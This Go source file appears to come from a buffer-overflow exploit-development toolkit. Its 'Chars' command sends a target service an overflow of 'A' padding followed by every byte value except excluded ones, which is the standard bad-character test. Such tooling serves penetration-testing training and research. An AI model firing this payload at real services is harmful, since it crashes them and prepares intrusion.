package overflow

import (
    "fmt"
    "net"
)

// ...
type Chars struct {
    offset  int
    exclude string
}

// ...
func NewChars(offset int, exclude string) Chars {
    return Chars{ offset, exclude }
}

// ...
func (c Chars) Run(host Host, tmpl string) {
    // parse exclusions
    fmt.Println(" > parsing exclusions")
    exclusions, err := parseHex(c.exclude)
    if err != nil {
        fmt.Printf("\n error: %s\n", err)
        return
    }

    // generate the overflow
    pad := generateBytes(0x41, c.offset + 4)

    // generate the byte array of characters to send to the target service
    fmt.Println(" > generating characters")
    data := append(pad, generateCharacters(exclusions)...)

    // build payload
    fmt.Println(" > building payload")
    payload := Payload{ data, tmpl }

    // send payload to target service
    fmt.Printf(" > sending %d-byte payload\n", payload.Size())
    if err = host.SendPayload(payload); err != nil {
        fmt.Printf("\n error: %s\n", err.(*net.OpError).Err)
        return
    }

    // notify user that the payload was successfully delivered
    fmt.Println("\n success: no errors found")
}

// generates a slice of bytes from 0x00 to 0xFF, excluding specified bytes
func generateCharacters(exclude []byte) []byte {
    data := make([]byte, 256 - len(exclude))

    // anonymous function for checking whether slice contains byte
    contains := func(arr []byte, a byte) bool {
        for _, elem := range arr {
            if elem == a {
                return true
            }
        }

        return false
    }

    // for each byte in range [0, 255], add to output slice if not in
    // exclusions slice
    j := 0
    for i := 0; i < 256; i++ {
        if !contains(exclude, byte(i)) {
            data[j] = byte(i)
            j += 1
        }
    }

    return data
}

